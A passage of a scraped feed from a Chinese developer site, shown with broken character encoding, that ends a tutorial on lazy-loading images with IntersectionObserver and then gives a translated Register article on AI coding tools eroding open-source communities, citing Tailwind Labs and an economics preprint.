    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
        <span class="hljs-selector-tag">img</span> {
            <span class="hljs-attribute">display</span>: block;
            <span class="hljs-attribute">height</span>: <span class="hljs-number">200px</span>;
            <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">20px</span>;
        }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">""</span> <span class="hljs-attr">lazyload</span>=<span class="hljs-string">"true"</span> <span class="hljs-attr">data-origin</span>=<span class="hljs-string">"å›¾ç‰‡åœ°å€"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- å¤šå¼ å›¾ç‰‡çœç•¥ --&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
        <span class="hljs-keyword">const</span> io = <span class="hljs-keyword">new</span> <span class="hljs-title class_">IntersectionObserver</span>(
            <span class="hljs-function">(<span class="hljs-params">entries</span>) =&gt;</span> {
                entries.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> {
                    <span class="hljs-keyword">if</span> (item.<span class="hljs-property">isIntersecting</span>) {
                        item.<span class="hljs-property">target</span>.<span class="hljs-property">src</span> = item.<span class="hljs-property">target</span>.<span class="hljs-property">dataset</span>.<span class="hljs-property">origin</span>
                        item.<span class="hljs-property">target</span>.<span class="hljs-title function_">removeAttribute</span>(<span class="hljs-string">'lazyload'</span>)
                        io.<span class="hljs-title function_">unobserve</span>(item.<span class="hljs-property">target</span>)
                    }
                })
            }
        )

        <span class="hljs-keyword">const</span> imgs = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'img[lazyload]'</span>)
        imgs.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">img</span> =&gt;</span> {
                io.<span class="hljs-title function_">observe</span>(img)
            }
        )
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>

<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p><strong>ä¼˜ç‚¹</strong>ï¼šæ€§èƒ½æœ€ä¼˜ï¼šæµè§ˆå™¨å¼‚æ­¥å¤„ç†ï¼Œä¸é˜»å¡ä¸»çº¿ç¨‹ã€‚ä»£ç æç®€ï¼šæ— éœ€æ‰‹åŠ¨è®¡ç®—ä½ç½®æˆ–å¤„ç†æ»šåŠ¨ï¼›è‡ªåŠ¨åœæ­¢è§‚å¯Ÿï¼šåŠ è½½åç«‹å³è§£é™¤ç›‘å¬ï¼ŒèŠ‚çœèµ„æºã€‚</p>
<p><strong>ç¼ºç‚¹</strong>ï¼šå…¼å®¹æ€§æœ‰é™ï¼š<code>IE æµè§ˆå™¨ä¸æ”¯æŒ</code>ï¼ˆéœ€é™çº§æ–¹æ¡ˆï¼‰</p>
<h2 data-id="heading-14">æ€»ç»“</h2>
<p>æ‡’åŠ è½½æŠ€æœ¯ä½œä¸ºä¼˜åŒ–ç½‘é¡µæ€§èƒ½çš„æœ‰æ•ˆæ‰‹æ®µï¼Œåœ¨æå‡ç”¨æˆ·ä½“éªŒæ–¹é¢å‘æŒ¥ç€é‡è¦ä½œç”¨ã€‚ä»åŸç†ä¸Šçœ‹ï¼Œå®ƒæŒ‰éœ€åŠ è½½å›¾ç‰‡ï¼Œé¿å…èµ„æºæµªè´¹ï¼Œæ˜¾è‘—å‡å°‘é¡µé¢åˆå§‹åŠ è½½æ—¶é—´ã€‚</p>
<p>åŸç”ŸJavaScriptæ–¹æ¡ˆå‡­å€ŸåŸºç¡€<code>DOMæ“ä½œä¸äº‹ä»¶ç›‘å¬</code>ï¼Œå…·å¤‡è‰¯å¥½å…¼å®¹æ€§ä¸çµæ´»æ€§ï¼Œè™½éœ€æ‰‹åŠ¨å¤„ç†ç»†èŠ‚ï¼Œä½†èƒ½ç²¾å‡†æŠŠæ§åŠ è½½é€»è¾‘ï¼›</p>
<p><code>Intersection Observer</code>åˆ™æ›´ä¸ºç®€æ´é«˜æ•ˆï¼Œè‡ªåŠ¨ç›‘å¬å…ƒç´ å¯è§æ€§ï¼Œå¤§å¹…é™ä½å¼€å‘å·¥ä½œé‡ï¼Œä¸”æ€§èƒ½è¡¨ç°å‡ºè‰²ã€‚</p>
<p>åœ¨å®é™…åº”ç”¨ä¸­ï¼Œå¼€å‘è€…å¯ä¾æ®é¡¹ç›®éœ€æ±‚ã€æµè§ˆå™¨å…¼å®¹æ€§ç­‰å› ç´ çµæ´»é€‰æ‹©ã€‚éšç€äº’è”ç½‘å¯¹æ€§èƒ½è¦æ±‚æŒç»­æå‡ï¼Œæ‡’åŠ è½½æŠ€æœ¯å°†ä¸æ–­æ¼”è¿›ï¼Œä¸ºæ‰“é€ æ›´æµç•…ã€é«˜æ•ˆçš„ç½‘é¡µä½“éªŒè´¡çŒ®åŠ›é‡ âœ¨ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å½“AIç¼–ç¨‹æˆä¸ºç¨‹åºå‘˜çš„ç¬¬ä¸€é€‰æ‹©ï¼Œå¼€æºç¤¾åŒºæ­£èµ°å‘æ­»äº¡ï¼]]></title>    <link>https://juejin.cn/post/7600986495927271465</link>    <guid>https://juejin.cn/post/7600986495927271465</guid>    <pubDate>2026-01-31T02:23:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600986495927271465" data-draft-id="7600989427906052150" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å½“AIç¼–ç¨‹æˆä¸ºç¨‹åºå‘˜çš„ç¬¬ä¸€é€‰æ‹©ï¼Œå¼€æºç¤¾åŒºæ­£èµ°å‘æ­»äº¡ï¼"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,AIç¼–ç¨‹,Trae"/> <meta itemprop="datePublished" content="2026-01-31T02:23:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å€”å¼ºé’é“œä¸‰"/> <meta itemprop="url" content="https://juejin.cn/user/2942757076730455"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å½“AIç¼–ç¨‹æˆä¸ºç¨‹åºå‘˜çš„ç¬¬ä¸€é€‰æ‹©ï¼Œå¼€æºç¤¾åŒºæ­£èµ°å‘æ­»äº¡ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2942757076730455/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å€”å¼ºé’é“œä¸‰
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-31T02:23:33.000Z" title="Sat Jan 31 2026 02:23:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-31
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.theregister.com%2F2026%2F01%2F26%2Fvibe_coding_hazardous_open_source%2F" target="_blank" title="https://www.theregister.com/2026/01/26/vibe_coding_hazardous_open_source/" ref="nofollow noopener noreferrer">www.theregister.com/2026/01/26/â€¦</a><br/>
ä½œè€…ï¼š The Register<br/>
è¯‘è€…ï¼š å€”å¼ºé’é“œä¸‰</p>
<h2 data-id="heading-0">å‰è¨€</h2>
<p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯<strong>å€”å¼ºé’é“œä¸‰</strong>ã€‚æ¬¢è¿å…³æ³¨æˆ‘ï¼Œ<strong>å¾®ä¿¡å…¬ä¼—å·ï¼šå€”å¼ºé’é“œä¸‰</strong>ã€‚æ¬¢è¿ç‚¹èµã€æ”¶è—ã€å…³æ³¨ï¼Œä¸€é”®ä¸‰è¿ï¼ï¼ï¼</p>
<p>Tailwind Labs CEO Adam Wathan æœ€è¿‘æŒ‡è´£ AI è¿«ä½¿å…¬å¸è§£é›‡äº†ä¸‰åå‘˜å·¥ã€‚</p>
<p>Tailwind Labs è´Ÿè´£å¼€æº Tailwind CSS æ¡†æ¶çš„å¼€å‘ã€‚æ® Wathan ç§°ï¼ŒAI ç¼–ç¨‹å·¥å…·åœ¨å…¬å¸ä¸å®¢æˆ·ä¹‹é—´æ¶èµ·äº†ä¸€é“å±éšœï¼Œå¯¼è‡´ç½‘ç«™æµé‡ä¸‹é™ï¼Œè¿›è€Œå½±å“äº†äº§å“æ›å…‰åº¦ã€‚</p>
<p>"å°½ç®¡ Tailwind æ¯”ä»¥å¾€ä»»ä½•æ—¶å€™éƒ½æ›´å—æ¬¢è¿ï¼Œä½†è‡ª 2023 å¹´åˆä»¥æ¥ï¼Œæˆ‘ä»¬æ–‡æ¡£çš„è®¿é—®é‡ä¸‹é™äº†çº¦ 40%ï¼Œ" ä»–æœ¬æœˆåœ¨ GitHub Issues å¸–å­ä¸­å†™é“ã€‚"æ–‡æ¡£æ˜¯äººä»¬äº†è§£æˆ‘ä»¬å•†ä¸šäº§å“çš„å”¯ä¸€é€”å¾„ï¼Œæ²¡æœ‰å®¢æˆ·ï¼Œæˆ‘ä»¬å°±æ— æ³•æ‰¿æ‹…ç»´æŠ¤æ¡†æ¶çš„è´¹ç”¨ã€‚"</p>
<p>æœ€è¿‘çš„ä¸€ç¯‡é¢„å°æœ¬è®ºæ–‡å¼•ç”¨äº† Tailwind Labs çš„æƒ…å†µä½œä¸ºè¯æ®ï¼Œè¯æ˜ AI ç¼–ç¨‹å·¥å…·çš„æ—¥ç›Šé‡‡ç”¨ä»£è¡¨äº†å¼€æºç¤¾åŒºçš„ä¸€ä¸ªç ´åæ€§å˜é©ã€‚</p>
<p>è¿™ç¯‡é¢˜ä¸ºã€Šæ°›å›´ç¼–ç¨‹æ‰¼æ€å¼€æºã€‹çš„è®ºæ–‡ç”± MiklÃ³s Korenï¼ˆä¸­æ¬§å¤§å­¦ã€KRTKã€CEPR å’Œ CESifoï¼‰ã€GÃ¡bor BÃ©kÃ©sï¼ˆä¸­æ¬§å¤§å­¦ã€KRTK å’Œ CEPRï¼‰ã€Julian Hinzï¼ˆæ¯”å‹’è´¹å°”å¾·å¤§å­¦å’ŒåŸºå°”ä¸–ç•Œç»æµç ”ç©¶æ‰€ï¼‰å’Œ Aaron Lohmannï¼ˆåŸºå°”ä¸–ç•Œç»æµç ”ç©¶æ‰€ï¼‰å…±åŒæ’°å†™ã€‚</p>
<p>æœ¬è´¨ä¸Šï¼Œè¿™ç¯‡è®ºæ–‡è®¤ä¸ºï¼ŒAI å·¥å…·ä»¥æŸç§æ–¹å¼å®‰è£…å¼€æºä¾èµ–ï¼Œå°†è½¯ä»¶å¼€å‘äººå‘˜ä¸é¡¹ç›®ç»´æŠ¤è€…éš”ç¦»å¼€æ¥ï¼Œç ´åäº†é‚£äº›å¯èƒ½ä¸ºè½¯ä»¶ç»´æŠ¤å·¥ä½œå¸¦æ¥å›æŠ¥çš„äº’åŠ¨ã€‚</p>
<p>"æ°›å›´ç¼–ç¨‹é€šè¿‡é™ä½ä½¿ç”¨å’ŒåŸºäºç°æœ‰ä»£ç æ„å»ºçš„æˆæœ¬æ¥æé«˜ç”Ÿäº§åŠ›ï¼Œä½†å®ƒä¹Ÿå‰Šå¼±äº†è®¸å¤šç»´æŠ¤è€…è·å¾—å›æŠ¥çš„ç”¨æˆ·å‚ä¸åº¦ï¼Œ" ä½œè€…ä»¬æŒ‡å‡ºã€‚"å½“å¼€æºè½¯ä»¶ä»…é€šè¿‡ç›´æ¥ç”¨æˆ·å‚ä¸å®ç°è´§å¸åŒ–æ—¶ï¼Œæ°›å›´ç¼–ç¨‹çš„æ›´å¹¿æ³›é‡‡ç”¨ä¼šé™ä½å‚ä¸åº¦å’Œåˆ†äº«ï¼Œå‡å°‘å¼€æºè½¯ä»¶çš„å¯ç”¨æ€§å’Œè´¨é‡ï¼Œå°½ç®¡ç”Ÿäº§åŠ›æ›´é«˜ï¼Œä½†ç¦åˆ©å´é™ä½äº†ã€‚"</p>
<p>è®ºæ–‡åˆè‘—è€…ã€å¥¥åœ°åˆ©ç»´ä¹Ÿçº³ä¸­æ¬§å¤§å­¦ç»æµå­¦æ•™æˆ Koren åœ¨ç»™ The Register çš„ç”µå­é‚®ä»¶ä¸­è¡¨ç¤ºï¼ŒAI å·¥å…·å‰Šå¼±ä¸å¼€æºç¤¾åŒºå‚ä¸åº¦çš„è¯æ®å¤§å¤šæ˜¯é—´æ¥çš„ã€‚</p>
<p>"ChatGPT å‘å¸ƒåï¼ŒStack Overflow çš„é—®é¢˜æ•°é‡æœ‰è®°å½•çš„ä¸‹é™ï¼›è€Œä¸”åœ¨ ChatGPT æ— æ³•è®¿é—®çš„å›½å®¶ï¼Œè¿™ç§ä¸‹é™é€Ÿåº¦æ›´å¿«ï¼Œ"ä»–è¯´ã€‚"ç¤¾äº¤åª’ä½“ä¸Šæµä¼ ç€è®¸å¤šç±»ä¼¼çš„è½¶äº‹ã€‚äº‹å®ä¸Šï¼Œåœ¨ Tailwind çš„æ¡ˆä¾‹è¢«å…¬å¼€ä¹‹å‰ï¼Œæˆ‘ä»¬å°±å·²ç»å¼€å§‹æ’°å†™è¿™ç¯‡è®ºæ–‡äº†ã€‚"</p>
<p>Koren è¡¨ç¤ºï¼Œè®ºæ–‡çš„å‘ç°ä»£è¡¨äº†ä»–å’Œåˆè‘—è€…æ ¹æ®å¼€æºè½¯ä»¶ç”Ÿæ€ç³»ç»Ÿçš„ç»æµæ¨¡å‹æ‰€äº†è§£æƒ…å†µçš„æ¨æ¼”ã€‚</p>
<p>"æˆ‘ä»¬çŸ¥é“å¼€å‘è€…éå¸¸å¿«åœ°é‡‡ç”¨äº†æ°›å›´ç¼–ç¨‹ï¼Œ"ä»–è¯´ã€‚[Anthropic CEO] Dario Amodei åœ¨ 2025 å¹´ 9 æœˆçš„ Axios AI+ å³°ä¼šä¸Šæ›¾è‘—ååœ°è¡¨ç¤ºï¼Œ'åœ¨ Anthropic ç¼–å†™çš„ä»£ç ä¸­ï¼Œ70%ã€80%ã€90% æ˜¯ç”± Claude ç¼–å†™çš„ã€‚'å› æ­¤ï¼Œæ°›å›´ç¼–ç¨‹çš„ç”¨æˆ·å¾ˆå®¹æ˜“åˆ‡æ¢åˆ°è¿™ç§è½¯ä»¶å¼€å‘æ¨¡å¼ã€‚è¿™æ„å‘³ç€äººç±»å¯¹å¼€æºè½¯ä»¶ç”Ÿäº§è€…çš„å…³æ³¨æ­£åœ¨å‡å°‘ã€‚"</p>
<ul>
<li>ä¸€ä½å¼€å‘è€…å¦‚ä½•ä½¿ç”¨ Claude æ„å»ºäº† C è¯­è¨€çš„å†…å­˜å®‰å…¨æ‰©å±•</li>
<li>Claude ç°åœ¨å¯ä»¥ä»å…¶ä»–åº”ç”¨ç¨‹åºä¸­æå–ç•Œé¢å…ƒç´ </li>
<li>Gallup ç§°ï¼Œå·¥ä½œä¸­ AI çš„é‡‡ç”¨åœ¨ç¬¬å››å­£åº¦é™·å…¥åœæ»</li>
<li>Oracle AI é€šè¿‡è¾¹ç¼˜äº‘å¥—ä»¶åœ¨çš‡å®¶æµ·å†›æ——èˆ°ä¸Šç¯çƒèˆªè¡Œ</li>
</ul>
<p>Koren è¡¨ç¤ºï¼Œè¿™ç§æ³¨æ„åŠ›è½¬ç§»çš„å½±å“ä¸ä»…ä»¥æ”¶å…¥æ¥è¡¡é‡ã€‚ç›¸åï¼Œå®ƒè¢«è¯„ä¼°ä¸ºå¼€æºå¼€å‘è€…å¯è·å¾—çš„å„ç§å¥–åŠ±çš„ç»¼åˆï¼Œå¦‚ç¤¾åŒºè®¤å¯ã€å£°èª‰å’ŒèŒä¸šå‰æ™¯ï¼Œä»–æŒ‡å‡ºæœ€è¿‘çš„ä¸€ç¯‡è®ºæ–‡ [PDF] å‘ç°"å¼€æºå¼€å‘è€…åˆ›é€ çš„æ€»ä»·å€¼ä¸­ï¼Œåªæœ‰çº¦ 0.1% è¢«ä»–ä»¬è‡ªå·±è·å¾—ã€‚"</p>
<p>Koren è¡¨ç¤ºï¼ŒAI å·¥å…·é‡‡ç”¨çš„å½±å“å› é¡¹ç›®çš„è§„æ¨¡å’Œæ²»ç†è€Œå¼‚ã€‚</p>
<p>"é«˜è´¨é‡çš„é¡¹ç›®ä»ç„¶å¯ä»¥è“¬å‹ƒå‘å±•ï¼Œ"ä»–è¯´ã€‚"å¼€æºè½¯ä»¶å¼€å‘è€…éœ€è¦å…¶é¡¹ç›®çš„å¯è§æ€§ï¼Œä»¥ä»ç”¨æˆ·é‚£é‡Œæ”¶é›†æœ‰ç”¨çš„åé¦ˆï¼Œæ‹›å‹Ÿæ–°çš„å¼€å‘è€…å’Œç»´æŠ¤è€…ï¼Œå¹¶ä»ç¤¾åŒºä¸­è·å¾—èµèª‰ã€‚æˆ‘ä»¬ä¸è®¤ä¸ºå¤§å‹å¼€æºé¡¹ç›®ä¼šä¸€å¤œä¹‹é—´æ¶ˆå¤±ã€‚ä½†è¦è¶…è¶Š'å†·å¯åŠ¨é—®é¢˜'å¹¶è®©ä¸€ä¸ªåŸæœ¬æœ‰å¸Œæœ›çš„é¡¹ç›®èµ·æ­¥ä¼šå˜å¾—æ›´åŠ å›°éš¾ã€‚æˆ–è€…ï¼Œå‹‰å¼ºæˆåŠŸçš„é¡¹ç›®çš„ç»´æŠ¤è€…å¯èƒ½ä¼šå¤±å»åŠ¨åŠ›å¹¶åœæ­¢è´¡çŒ®ã€‚ä¼ è¯´ä¸­çš„'å†…å¸ƒæ‹‰æ–¯åŠ å·çš„éšæœºäººå£«'å¯èƒ½ä¼šæ”¾å¼ƒã€‚"</p>
<p>Koren è¡¨ç¤ºï¼Œè¿™æ˜¯ä¸€ä¸ªéœ€è¦è¡Œä¸šé›†ä½“è¡ŒåŠ¨çš„ç³»ç»Ÿæ€§é—®é¢˜ã€‚</p>
<p>"ä¼ ç»Ÿä¸Šï¼Œå¼€æºè½¯ä»¶å·¥ä½œæ²¡æœ‰ç›´æ¥å¾—åˆ°ç”¨æˆ·çš„è¡¥å¿ï¼Œä¸æ˜¯å› ä¸ºä»–ä»¬ä¸é‡è§†å¼€æºè½¯ä»¶ï¼Œè€Œæ˜¯å› ä¸ºæ¶‰åŠçš„æ‘©æ“¦ï¼Œ"ä»–è§£é‡Šè¯´ã€‚"å¯¹äºä»»ä½•ç»™å®šé¡¹ç›®ï¼Œæˆ‘å¯èƒ½ä¼šä½¿ç”¨å‡ åä¸ªåº“ã€‚æˆ‘ä¸ä¼šæŸ¥æ‰¾æ¯ä¸ªå•ç‹¬çš„ç»´æŠ¤è€…å¹¶ç»™ä»–ä»¬å‡ åˆ†ä¹‹ä¸€ç¾åˆ†ã€‚GitHub æˆ– npm æœ‰æ­£åœ¨è¿›è¡Œçš„èµ„åŠ©æ´»åŠ¨ï¼Œä½†è¿™äº›å¹¶ä¸èƒ½è§£å†³é—®é¢˜ï¼Œå› ä¸ºå®ƒä»¬ä»ç„¶éœ€è¦ç”¨æˆ·å…³æ³¨å¹¶æ‰“å¼€é’±åŒ…ã€‚"</p>
<p>ä½† AI å…¬å¸å¯ä»¥æä¾›å¸®åŠ©ï¼ŒKoren è®¤ä¸ºï¼Œä»–æŒ‡å‡ºå¤§å¤šæ•° LLM æ¨ç†ç”±å°‘æ•°å¤§å‹æä¾›å•†ï¼ˆå¦‚ OpenAIã€Anthropicï¼‰æˆ–ç¬¬ä¸‰æ–¹æä¾›å•†ï¼ˆå¦‚ OpenRouter å’Œ Groqï¼‰å®Œæˆã€‚</p>
<p>"è®¡é‡æ¯ä¸ªå¼€æºåº“çš„ä½¿ç”¨é‡åœ¨æŠ€æœ¯ä¸Šå¾ˆç®€å•ï¼Œ"ä»–è¯´ã€‚"è¿™å¯ä»¥ä½œä¸ºæ”¶å…¥åˆ†äº«åè®®çš„åŸºç¡€ã€‚å°±åƒ Spotify æ ¹æ®æ’­æ”¾æ—¶é—´å‘è‰ºæœ¯å®¶ä»˜è´¹ä¸€æ ·ï¼Œå¼€æºå¼€å‘è€…å¯ä»¥æ ¹æ®å®é™…ä½¿ç”¨æƒ…å†µåˆ†äº«éƒ¨åˆ† LLM æ”¶å…¥ã€‚"</p>
<p>Flask çš„åˆ›é€ è€…ã€ç»éªŒä¸°å¯Œçš„å¼€æºå¼€å‘è€… Armin Ronacher åœ¨ç»™ The Register çš„ç”µå­é‚®ä»¶ä¸­è¡¨ç¤ºï¼Œè™½ç„¶ AI æ”¹å˜äº†å¼€æºï¼Œä½†ä»–ä¿ç•™åˆ¤æ–­ã€‚</p>
<p>"AI ç¡®å®æ­£åœ¨æ”¹å˜å¼€æºçš„å¾ˆå¤šåŠ¨æ€ï¼Œ"Ronacher è¯´ã€‚"ç‰¹åˆ«æ˜¯ï¼Œå®ƒä½¿ä»£ç æ›´ä¾¿å®œï¼Œå¹¶æ”¹å˜äº†ç›¸å…³çš„è®¡ç®—ã€‚å¼€æºç°åœ¨çœ‹åˆ°æ›´å¤šä½è´¨é‡çš„è´¡çŒ®ï¼Œä½†å¦ä¸€æ–¹é¢ï¼Œå®ƒå¯èƒ½ä¼šåŠ å¼ºä¸€äº›å…³é”®é¡¹ç›®ï¼Œåœ¨è¿™äº›é¡¹ç›®ä¸­ï¼Œä¿¡ä»»æ¥è‡ªæœ‰è‰¯å¥½è®°å½•çš„å¼ºå¤§ç»´æŠ¤è€…ã€‚"</p>
<p>"æˆ‘è®¤ä¸ºç°åœ¨è¯´è¿™å°†èµ°å‘ä½•æ–¹è¿˜ä¸ºæ—¶è¿‡æ—©ã€‚è¿™æ˜¯ä¸€ä¸ªå·¨å¤§çš„è½¬å˜ï¼Œæˆ‘ä»¬å°†åœ¨å‡ å¹´å†…çœ‹åˆ°æ•ˆæœã€‚è¿™å°†éœ€è¦ä¸€äº›é‡æ–°è°ƒæ•´ï¼Œåœ¨ä¸€åˆ‡å†æ¬¡ç¨³å®šä¹‹å‰ï¼Œå¾ˆéš¾å¾—å‡ºç»“è®ºã€‚"</p>
<p>"æ€»çš„æ¥è¯´ï¼Œæˆ‘ç°åœ¨ä¸ä¼šè¿‡å¤šè€ƒè™‘ä»»ä½•å±è¨€è€¸å¬çš„è¯´æ³•ã€‚åœ¨æ‰¾åˆ°æ–°å¸¸æ€ä¹‹å‰ï¼Œç›®å‰æŠ•å…¥å…ƒè®¨è®ºçš„æ‰€æœ‰ç²¾åŠ›ä¼¼ä¹éƒ½æ˜¯æµªè´¹ã€‚"</p>
<h2 data-id="heading-1">æ€»ç»“</h2>
